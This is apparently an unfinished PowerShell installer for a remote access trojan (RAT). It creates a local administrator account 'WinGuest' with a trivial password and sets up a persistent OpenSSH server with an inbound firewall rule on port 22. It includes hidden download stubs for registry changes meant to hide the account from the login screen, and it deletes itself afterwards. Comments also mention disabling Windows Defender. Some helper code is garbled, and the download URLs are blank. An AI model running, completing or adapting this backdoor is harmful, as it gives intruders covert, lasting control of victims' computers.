# BUILD RESOURCES FOR RAT
# CREATED BY : Mohid Mughal

# Random string creator to create names for files
function random_text {
    return -join((65..90) + (97..22) | Get-Random -Count 5 | % {[char]$__})
}


### Disable Win Defender and get ep (execution policy) bypass
###

######################################################################################
# Function to Craetes Local Admin for RATy
function craete_account {
    [CmdletBinding()]

    param (
        [string] $uname,
        [securestring] $pword
    )
    
    begin {
    }
    
    process {
        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Desciption "Temporary local admin"
        Write-Verbose "$uname local user craeted" 
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        Write-Verbose "$uname added to the local administrator group"
    }
    
    end {
    }
}

#Creates Admin User
$uname = "WinGuest"    # Username for the newly created LocalAdmin
$pword = (ConvertTo-SecureString "admin" -AsPlainText -Force)   # Password for the Newly Created LocalAdmin
craete_account -uname $uname -pword $pword   # Creates LocalAdmin on getters end
######################################################################################


#  VARIABLES
# FOR Working Directory names, inside Temp Directory of Windows
$wd = random_text    # creates and store a string of random characters inside $wd (working directory) which can be later given to a file as "name"
$path = "$env:temp/$wd"    # path of the folder in temp directory in which we will store our RAT related files
$initial_dir = Get-Location    # for storing the current directory we are in OR where the 'installer.ps1' file is placed, will be used for self deleting 'installer.ps1' file in the end - 'Get-Location' in .ps1 == '%cd%' in .cmd
echo $path

# GOTO TEMP Directory and do the Magic
mkdir $path   # creates a folder inside temp directory with the name stored in the $wd variable (name will be a string of random characters)
cd $path    # moves to our own created folder inside temp directory of windows


# Invoke Persistent SSH
###########################################################################################
# Will Install OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Will Start the Server after Download and Install (automatic in background) || -Name sshd  -- means that the sshd service shoud start 
# sshd (Sexure Shell Daemon) is a server side prigram that looks for and handles incoming ssh requests - authenticating them and establishing ssh connections 
Start-Service -Name sshd

# It will make sure that the SSH service starts automatically when the PC restarts
Set-Service -Name sshd -StartupType Automatic

# It will CHECK if a firewall rule for SSH connections exists - and '$sshRule' will ahve value NULL in case no SSH rule is found
$sshRule = Get-NetFirewallRule -Name *ssh* -ErrorAction SilentlyContinue

# If in case no rule exists, it will create a new firewall rule to allow SSH traffic
if (-not $sshRule) {
    Write-Host "No SSH firewall rule found. Creating one..."
    New-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -DisplayName "Allow SSH" `
        -Enabled True -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
} else {
    Write-Host "SSH firewall rule already exists."
}
###########################################################################################


# Getting Registry file (that will make some changes in WIN Reg to make sure that the newly created user doesnt show on Login Screen when the user starts his PC) and Code to run it automatically (Confirming the changes in registry)
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI '' -OutFile '' "
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI '' -OutFile '' "


# Install/Run the Registry && conformation code HERE


# if in future i need to create and put any file in the created (random named) folder inside the temp directory, the code for creating that particular file will go here
###


#Same as PAUSE command in .cmd
Read-Host "Wanna delete 'installer.ps1'? Press any key to continue"

# self delete
cd $initial_dir
del installer.ps1
